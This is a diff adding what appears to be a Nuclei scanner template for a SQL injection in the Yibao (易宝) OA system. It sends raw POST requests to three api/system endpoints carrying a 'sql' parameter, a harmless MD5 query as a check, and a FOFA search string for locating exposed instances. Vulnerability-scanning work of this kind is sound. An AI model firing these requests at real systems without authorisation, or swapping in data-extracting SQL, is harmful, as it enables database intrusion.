@@ -1,0 +1,51 @@
+id: epro-api-system-mutli-sqli
+info:
+  name: 易宝 OA mutli api/system/ - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%98%93%E5%AE%9DOA/%E6%98%93%E5%AE%9DOA-ExecuteSqlForDataSet%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="欢迎登录易宝OA系统" || app="顶讯科技-易宝OA系统"
+  tags: epro,sqli,oa
+
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Content-Length: 103
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
+      
+      - |
+        POST /api/system/ExecuteSqlForSingle HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Content-Length: 103
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
+
+      - |
+        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Content-Length: 103
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
+    
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'e10adc3949ba59abbe56e057f20f883e')
+        condition: and
